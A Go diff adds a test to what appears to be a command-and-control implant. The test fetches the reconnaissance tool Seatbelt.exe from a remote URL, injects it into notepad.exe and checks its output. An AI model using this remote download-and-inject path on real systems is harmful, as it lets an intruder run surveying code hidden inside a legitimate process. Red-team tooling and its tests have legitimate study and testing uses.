@@ -223,3 +223,40 @@ func TestCommandExec(t *testing.T) {
 		return
 	}
 }
+
+func TestRemote(t *testing.T) {
+	packetArgument := make(model.PacketArgument, 2)
+	packetArgument["shelltype"] = "remote"
+
+	packetArgument["url"] = "https://antnium.yookiterm.ch/static/Seatbelt.exe"
+	packetArgument["type"] = ""
+	packetArgument["argline"] = "DotNet"
+	packetArgument["injectInto"] = "C:\\windows\\notepad.exe"
+
+	stdOut, stdErr, pid, exitCode, err := arch.Exec(packetArgument)
+	if err != nil {
+		t.Error("Error: " + err.Error())
+		return
+	}
+	if len(stdOut) == 0 {
+		t.Error("No stdout")
+		return
+	}
+	out := string(stdOut)
+	if !strings.Contains(out, "====== DotNet ======") {
+		t.Errorf("Output: %s", out)
+		return
+	}
+	if len(stdErr) != 0 {
+		t.Error("Stderr")
+		return
+	}
+	if pid == 0 {
+		t.Error("Pid")
+		return
+	}
+	if exitCode != 0 {
+		t.Error("ExitCode")
+		return
+	}
+}
